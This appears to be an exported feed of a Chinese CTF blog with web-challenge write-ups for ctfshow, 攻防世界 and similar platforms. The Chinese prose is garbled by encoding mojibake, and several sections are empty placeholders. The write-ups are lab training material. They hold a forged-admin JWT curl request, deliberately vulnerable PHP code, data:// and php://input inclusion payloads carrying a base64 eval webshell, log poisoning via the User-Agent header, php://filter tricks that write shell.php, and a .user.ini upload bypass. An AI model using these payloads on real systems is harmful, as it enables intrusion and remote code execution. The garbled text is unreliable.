class="hljs-keyword">if</span> decoded.get(<span class="hljs-string">&#x27;role&#x27;</span>) == <span class="hljs-string">&#x27;admin&#x27;</span>:<br>                <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>                    flag_content = f.read()<br>                <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&#x27;flag&#x27;</span>: flag_content&#125;), <span class="hljs-number">200</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&#x27;message&#x27;</span>: <span class="hljs-string">&#x27;Access denied: admin only&#x27;</span>&#125;), <span class="hljs-number">403</span><br>            <br>        <span class="hljs-keyword">except</span> FileNotFoundError:<br>            <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&#x27;message&#x27;</span>: <span class="hljs-string">&#x27;Flag file not found&#x27;</span>&#125;), <span class="hljs-number">404</span><br>        <span class="hljs-keyword">except</span> jwt.ExpiredSignatureError:<br>            <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&#x27;message&#x27;</span>: <span class="hljs-string">&#x27;Token has expired&#x27;</span>&#125;), <span class="hljs-number">401</span><br>        <span class="hljs-keyword">except</span> jwt.InvalidTokenError:<br>            <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&#x27;message&#x27;</span>: <span class="hljs-string">&#x27;Invalid token&#x27;</span>&#125;), <span class="hljs-number">401</span><br>    <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&#x27;message&#x27;</span>: <span class="hljs-string">&#x27;Token is missing&#x27;</span>&#125;), <span class="hljs-number">401</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(debug=<span class="hljs-literal">True</span>)<br><br></code></pre></td></tr></table></figure><p>åœ¨&#x2F;loginç™»å½•æ‹¿ä¸€ä¸ªtoken</p><p>ç”±äºä»–åœ¨jwt.decodeçš„æ—¶å€™æ²¡æœ‰å¯†é’¥ï¼Œé‚£ä¹ˆå°±å¯ä»¥ç”¨<a href="https://www.json.cn/jwt">å·¥å…·</a>å°†è½½è·ä¸­çš„roleå­—æ®µæ”¹ä¸ºadminï¼Œä¼ªé€ æˆadmin</p><p>ç„¶åç”¨ä¼ªé€ åçš„tokenæ”¾åœ¨Authorizationå­—æ®µä¸­è®¿é—®&#x2F;flagè·¯ç”±å³å¯</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">curl -X <span class="hljs-built_in">GET</span> <span class="hljs-string">&quot;http://challenge.imxbt.cn:30656/flag&quot;</span> -H <span class="hljs-string">&quot;Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ0ZXN0Iiwicm9sZSI6ImFkbWluIiwiZXhwIjoxNzYxOTAxMDkxfQ.ZeI83MKSZm_cykE5AdlQ2C_yVSyQqbHHGwFebegc-Mw&quot;</span><br></code></pre></td></tr></table></figure><h2 id="final"><a href="#final" class="headerlink" title="final"></a>final</h2><h3 id="JinjaMark"><a href="#JinjaMark" class="headerlink" title="JinjaMark"></a>JinjaMark</h3><h3 id="1z-php"><a href="#1z-php" class="headerlink" title="1z_php"></a>1z_php</h3><h3 id="lucky-number"><a href="#lucky-number" class="headerlink" title="lucky_number"></a>lucky_number</h3><h3 id="Back-to-the-Future"><a href="#Back-to-the-Future" class="headerlink" title="Back to the Future"></a>Back to the Future</h3><h3 id="Sql-Inject-or-RCE"><a href="#Sql-Inject-or-RCE" class="headerlink" title="Sql Inject or RCE"></a>Sql Inject or RCE</h3><h3 id="ez-php"><a href="#ez-php" class="headerlink" title="ez_php"></a>ez_php</h3><h3 id="Just-Readme"><a href="#Just-Readme" class="headerlink" title="Just Readme"></a>Just Readme</h3><p>Updatingâ€¦</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æ”»é˜²ä¸–ç•Œ</title>
    <link href="/2025/07/29/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"/>
    <url>/2025/07/29/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/</url>
    
    <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="éš¾åº¦1"><a href="#éš¾åº¦1" class="headerlink" title="éš¾åº¦1"></a>éš¾åº¦1</h2><h3 id="unseping"><a href="#unseping" class="headerlink" title="unseping"></a>unseping</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ease</span></span>&#123;<br>    <br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$method</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$args</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$method</span>, <span class="hljs-variable">$args</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;method = <span class="hljs-variable">$method</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;args = <span class="hljs-variable">$args</span>;<br>    &#125;<br> <br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$this</span>-&gt;method, <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;ping&quot;</span>))) &#123;<br>            <span class="hljs-title function_ invoke__">call_user_func_array</span>(<span class="hljs-keyword">array</span>(<span class="hljs-variable">$this</span>, <span class="hljs-variable">$this</span>-&gt;method), <span class="hljs-variable language_">$this</span>-&gt;args);<br>        &#125;<br>    &#125; <br> <br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ping</span>(<span class="hljs-params"><span class="hljs-variable">$ip</span></span>)</span>&#123;<br>        <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-variable">$ip</span>, <span class="hljs-variable">$result</span>);<br>        <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$result</span>);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match_all</span>(<span class="hljs-string">&quot;/(\||&amp;|;| |\/|cat|flag|tac|php|ls)/&quot;</span>, <span class="hljs-variable">$str</span>, <span class="hljs-variable">$pat_array</span>)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$str</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;don&#x27;t hack&quot;</span>;<br>        &#125;<br>    &#125;<br> <br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">foreach</span>(<span class="hljs-variable language_">$this</span>-&gt;args <span class="hljs-keyword">as</span> <span class="hljs-variable">$k</span> =&gt; <span class="hljs-variable">$v</span>) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;args[<span class="hljs-variable">$k</span>] = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">waf</span>(<span class="hljs-variable">$v</span>);<br>        &#125;<br>    &#125;   <br>&#125;<br><br><span class="hljs-variable">$ctf</span>=@<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ctf&#x27;</span>];<br>@<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$ctf</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Bugku</title>
    <link href="/2025/07/29/Bugku/"/>
    <url>/2025/07/29/Bugku/</url>
    
    <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><p>Updatingâ€¦</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF</title>
    <link href="/2025/07/29/BUUCTF/"/>
    <url>/2025/07/29/BUUCTF/</url>
    
    <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-EasySQL1"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-EasySQL1" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]EasySQL1"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]EasySQL1</h2><p>Updatingâ€¦</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ctfshow</title>
    <link href="/2025/07/29/ctfshow/"/>
    <url>/2025/07/29/ctfshow/</url>
    
    <content type="html"><![CDATA[<h1 id="webå…¥é—¨"><a href="#webå…¥é—¨" class="headerlink" title="webå…¥é—¨"></a>webå…¥é—¨</h1><h2 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><h2 id="çˆ†ç ´"><a href="#çˆ†ç ´" class="headerlink" title="çˆ†ç ´"></a>çˆ†ç ´</h2><h2 id="å‘½ä»¤æ‰§è¡Œ"><a href="#å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="å‘½ä»¤æ‰§è¡Œ"></a>å‘½ä»¤æ‰§è¡Œ</h2><h2 id="æ–‡ä»¶åŒ…å«"><a href="#æ–‡ä»¶åŒ…å«" class="headerlink" title="æ–‡ä»¶åŒ…å«"></a>æ–‡ä»¶åŒ…å«</h2><h3 id="web78"><a href="#web78" class="headerlink" title="web78"></a>web78</h3><p>dataä¼ªåè®®ç›´æ¥æ‰“</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gams">payloadï¼šurl/?<span class="hljs-keyword">file</span>=data:<span class="hljs-comment">//text/plain;base64,PD9waHAgQGV2YWwoJF9QT1NUWydhJ10pOyA/Pg==</span><br>postä¼ a=<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;cat flag.php&#x27;</span>);<br></code></pre></td></tr></table></figure><h3 id="web79"><a href="#web79" class="headerlink" title="web79"></a>web79</h3><p>åŒweb78</p><h3 id="web80"><a href="#web80" class="headerlink" title="web80"></a>web80</h3><p>phpå’Œdataçš„æ›¿æ¢ç”¨çš„æ˜¯str_replace()ï¼Œè¯¥å‡½æ•°åŒºåˆ†å¤§å°å†™ï¼Œå¯ä»¥ç”¨å¤§å°å†™ç»•è¿‡</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">payloadï¼šurl/?file=Php:<span class="hljs-comment">//input</span><br>postä¼ <span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;cp fl0g.php 1.txt&#x27;</span>); <span class="hljs-meta">?&gt;</span>ï¼Œå†è®¿é—®<span class="hljs-number">1</span>.txtå³å¯<br></code></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥ç”¨æ—¥å¿—åŒ…å«</p><p>bpæŠ“åŒ…å°†uaå¤´æ”¹ä¸º<code>&lt;?php eval($_POST[&#39;a&#39;]); ?&gt;</code>ï¼Œç„¶åè¿é©¬æˆ–ç›´æ¥å‘½ä»¤æ‰§è¡Œ</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gams">url/?<span class="hljs-keyword">file</span>=/var/<span class="hljs-built_in">log</span>/nginx/access.<span class="hljs-built_in">log</span><br>postä¼ a=<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;tac fl0g.php&#x27;</span>);phpinfo();<br></code></pre></td></tr></table></figure><h3 id="web81"><a href="#web81" class="headerlink" title="web81"></a>web81</h3><p>åŒweb80ç”¨æ—¥å¿—åŒ…å«</p><h3 id="web87"><a href="#web87" class="headerlink" title="web87"></a>web87</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-09-16 11:25:09</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-09-16 21:57:55</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    <span class="hljs-variable">$content</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;content&#x27;</span>];<br>    <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;php&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;data&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;:&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$file</span>), <span class="hljs-string">&quot;&lt;?php die(&#x27;å¤§ä½¬åˆ«ç§€äº†&#x27;);?&gt;&quot;</span>.<span class="hljs-variable">$content</span>);<br><br>    <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>åœ¨å†™æ–‡ä»¶æ—¶ï¼Œå¯¹$fileè¿›è¡Œäº†urldecodeï¼Œå¯ä»¥åˆ©ç”¨urläºŒç¼–ç ç»•è¿‡å‰é¢çš„str_replace</p><p>php:&#x2F;&#x2F;filterç»•è¿‡æ­»äº¡dieï¼ˆ<a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">è°ˆä¸€è°ˆphp:&#x2F;&#x2F;filterçš„å¦™ç”¨</a>ï¼‰</p><p>æ ¸å¿ƒåŸç†ï¼šåˆ©ç”¨php:&#x2F;&#x2F;filterçš„è¿‡æ»¤å™¨å°†æ­»äº¡dieå»é™¤</p><p>1ã€åˆ©ç”¨convert.base64-decode</p><p>base64ç¼–ç ä¸­åªåŒ…å«64ä¸ªå¯æ‰“å°å­—ç¬¦ï¼Œè€ŒPHPåœ¨è§£ç base64æ—¶ï¼Œé‡åˆ°ä¸åœ¨å…¶ä¸­çš„å­—ç¬¦æ—¶ï¼Œå°†ä¼šè·³è¿‡è¿™äº›å­—ç¬¦ï¼Œä»…å°†åˆæ³•å­—ç¬¦ç»„æˆä¸€ä¸ªæ–°çš„å­—ç¬¦ä¸²è¿›è¡Œè§£ç ã€‚</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs llvm">&lt;?php die(&#x27;å¤§ä½¬åˆ«ç§€äº†&#x27;)<span class="hljs-comment">;?&gt;æœ€ç»ˆå†™å…¥æ–‡ä»¶çš„å†…å®¹ä¸ºphpdieä½œä¸ºbase64ç¼–ç </span><br>æ ¹æ®base<span class="hljs-number">64</span>çš„ç¼–ç åŸç†ï¼Œ<span class="hljs-number">3</span>ä¸ªasciiå­—ç¬¦å°†è¢«ç¼–ç ä¸º<span class="hljs-number">4</span>ä¸ªbase<span class="hljs-number">64</span>å­—ç¬¦ï¼Œæ‰€ä»¥åº”è¯¥åœ¨ä¼ å…¥çš„contentå‰åŠ ä¸¤ä¸ªå­—ç¬¦ï¼ˆä¸èƒ½æ˜¯ç­‰å·ï¼Œç­‰å·æ˜¯ç”¨æ¥å‡‘ä½æ•°çš„ï¼Œå‡ºç°åœ¨base<span class="hljs-number">64</span>å­—ç¬¦ä¸²ç»“å°¾ï¼‰ä½¿phpdieaaèƒ½å¤Ÿæ­£å¸¸è§£ç è€Œä¸å½±å“contentçš„è§£ç <br><br>payloadï¼šurl/?file<span class="hljs-operator">=</span><span class="hljs-variable">%2570</span><span class="hljs-variable">%2568</span><span class="hljs-variable">%2570</span><span class="hljs-variable">%253</span>a<span class="hljs-variable">%252</span>f<span class="hljs-variable">%252</span>f<span class="hljs-variable">%2566</span><span class="hljs-variable">%2569</span><span class="hljs-variable">%256</span><span class="hljs-keyword">c</span><span class="hljs-variable">%2574</span><span class="hljs-variable">%2565</span><span class="hljs-variable">%2572</span><span class="hljs-variable">%252</span>f<span class="hljs-variable">%2577</span><span class="hljs-variable">%2572</span><span class="hljs-variable">%2569</span><span class="hljs-variable">%2574</span><span class="hljs-variable">%2565</span><span class="hljs-variable">%253</span>d<span class="hljs-variable">%2563</span><span class="hljs-variable">%256</span>f<span class="hljs-variable">%256</span>e<span class="hljs-variable">%2576</span><span class="hljs-variable">%2565</span><span class="hljs-variable">%2572</span><span class="hljs-variable">%2574</span><span class="hljs-variable">%252</span>e<span class="hljs-variable">%2562</span><span class="hljs-variable">%2561</span><span class="hljs-variable">%2573</span><span class="hljs-variable">%2565</span><span class="hljs-variable">%2536</span><span class="hljs-variable">%2534</span><span class="hljs-variable">%252</span>d<span class="hljs-variable">%2564</span><span class="hljs-variable">%2565</span><span class="hljs-variable">%2563</span><span class="hljs-variable">%256</span>f<span class="hljs-variable">%2564</span><span class="hljs-variable">%2565</span><span class="hljs-variable">%252</span>f<span class="hljs-variable">%2572</span><span class="hljs-variable">%2565</span><span class="hljs-variable">%2573</span><span class="hljs-variable">%256</span>f<span class="hljs-variable">%2575</span><span class="hljs-variable">%2572</span><span class="hljs-variable">%2563</span><span class="hljs-variable">%2565</span><span class="hljs-variable">%253</span>d<span class="hljs-variable">%2573</span><span class="hljs-variable">%2568</span><span class="hljs-variable">%2565</span><span class="hljs-variable">%256</span><span class="hljs-keyword">c</span><span class="hljs-variable">%256</span><span class="hljs-keyword">c</span><span class="hljs-variable">%252</span>e<span class="hljs-variable">%2570</span><span class="hljs-variable">%2568</span><span class="hljs-variable">%2570</span><br>postä¼ content<span class="hljs-operator">=</span>aaPD<span class="hljs-number">9</span>waHAgZXZhbCgkX<span class="hljs-number">1</span>BPU<span class="hljs-number">1</span>RbJ<span class="hljs-number">2</span>EnXSk<span class="hljs-number">7</span>ID<span class="hljs-number">8</span>+<br><br>ç„¶åè¿é©¬æˆ–åˆ©ç”¨å†™çš„shell.phpè¿›è¡Œrce<br></code></pre></td></tr></table></figure><p>2ã€åˆ©ç”¨string.rot13</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mel">url/?<span class="hljs-keyword">file</span>=%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%64%25%37%33%25%37%34%25%37%32%25%36%39%25%36%65%25%36%37%25%32%65%25%37%32%25%36%66%25%37%34%25%33%31%25%33%33%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%37%33%25%36%38%25%36%35%25%36%63%25%36%63%25%32%65%25%37%30%25%36%38%25%37%30<br>postä¼ content=&lt;?cuc riny($_CBFG[<span class="hljs-string">&#x27;o&#x27;</span>]); ?&gt;<br><br>ç„¶åè¿é©¬æˆ–åˆ©ç”¨å†™çš„shell.phpè¿›è¡Œrce<br></code></pre></td></tr></table></figure><h3 id="web88"><a href="#web88" class="headerlink" title="web88"></a>web88</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-09-16 11:25:09</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-09-17 02:27:25</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/php|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\-|\_|\+|\=|\./i&quot;</span>, <span class="hljs-variable">$file</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>è¿‡æ»¤äº†phpå…³é”®å­—åŠä¸€äº›å­—ç¬¦</p><p>åˆ©ç”¨data:&#x2F;&#x2F;ä¼ªåè®®ï¼Œç”±äºè¿‡æ»¤äº†å…³é”®å­—phpå’Œ&#x3D;ç­‰å­—ç¬¦ï¼Œä¸èƒ½ç›´æ¥åˆ©ç”¨ï¼Œè¦è¿›è¡Œbase64ç¼–ç ï¼Œä½†æ˜¯è¦é¿å…å‡ºç°&#x3D;å’Œ+ï¼Œå¯ä»¥åœ¨è¦ç¼–ç çš„å­—ç¬¦ä¸²ä¸­åŠ ç©ºæ ¼é¿å…&#x3D;å’Œ+å‡ºç°</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gams">payload: url/?<span class="hljs-keyword">file</span>=data:<span class="hljs-comment">//text/plain;base64,PD9waHAgZXZhbCgkX1BPU1RbJ2EnXSk7ICAgPz4g</span><br>postä¼ a=<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;tac fl0g.php&#x27;</span>);<br></code></pre></td></tr></table></figure><h2 id="phpç‰¹æ€§"><a href="#phpç‰¹æ€§" class="headerlink" title="phpç‰¹æ€§"></a>phpç‰¹æ€§</h2><h2 id="æ–‡ä»¶ä¸Šä¼ "><a href="#æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="æ–‡ä»¶ä¸Šä¼ "></a>æ–‡ä»¶ä¸Šä¼ </h2><h3 id="web151"><a href="#web151" class="headerlink" title="web151"></a>web151</h3><p>æç¤ºå‰ç«¯æ ¡éªŒä¸å¯é ï¼Œä¸Šä¼ å›¾ç‰‡é©¬ï¼ŒbpæŠ“åŒ…å°†æ–‡ä»¶åç¼€æ”¹ä¸ºphpï¼Œç»™äº†æ–‡ä»¶çš„ä¿å­˜è·¯å¾„ï¼Œç›´æ¥è¿›è¡Œrceæˆ–é€šè¿‡è¿é©¬æ‹¿flag</p><h3 id="web152"><a href="#web152" class="headerlink" title="web152"></a>web152</h3><p>æç¤ºåç«¯æ ¡éªŒè¦ä¸¥å¯†</p><p>ä¸Šä¼ shell.phpå¤±è´¥ï¼Œä¸Šä¼ shell.aaaå¤±è´¥</p><p>å‘ç°æŠ“ä¸åˆ°shell.phpå’Œshell.aaaçš„åŒ…ï¼Œåº”è¯¥ä¹Ÿæœ‰å‰ç«¯æ ¡éªŒï¼Œä¸Šä¼ shell.pngå¹¶æŠ“åŒ…</p><p>å°è¯•å°†åç¼€æ”¹ä¸ºphpï¼Œä¸Šä¼ æˆåŠŸï¼ŒçŒœæµ‹åç«¯åº”è¯¥æ˜¯MIMEç±»å‹æ£€æµ‹ï¼Œçœ‹ä¸€ä¸‹æºç ï¼Œä¸å‡ºæ‰€æ–™</p><h3 id="web153"><a href="#web153" class="headerlink" title="web153"></a>web153</h3><p>MIMEç±»å‹æ£€æµ‹+é»‘åå•æ£€æµ‹ï¼ˆæ˜¯æ¯ä¸€å…³éƒ½æœ‰å‰ç«¯æ ¡éªŒå—ï¼Ÿåªèƒ½æŠ“åˆ°shell.pngçš„åŒ…ï¼‰</p><p>æŠ“åˆ°shell.pngçš„åŒ…ï¼Œåˆ°é‡æ”¾å™¨ä¸­æ”¹åŒ…å°è¯•ä¸Šä¼ å…¶ä»–æ–‡ä»¶</p><p>ä¸Šä¼ user.iniï¼Œæ–‡ä»¶å†…å®¹<code>auto_prepend_file=shell.png</code>ï¼Œä¸Šä¼ æˆåŠŸï¼Œå†ä¸Šä¼ shell.png</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css">payload:url/upload/index.php<br>postä¼ a=<span class="hljs-built_in">system</span>(<span class="hljs-string">&#x27;cat ../flag.php&#x27;</span>);<br></code></pre></td></tr></table></figure><h3 id="web154"><a href="#web154" 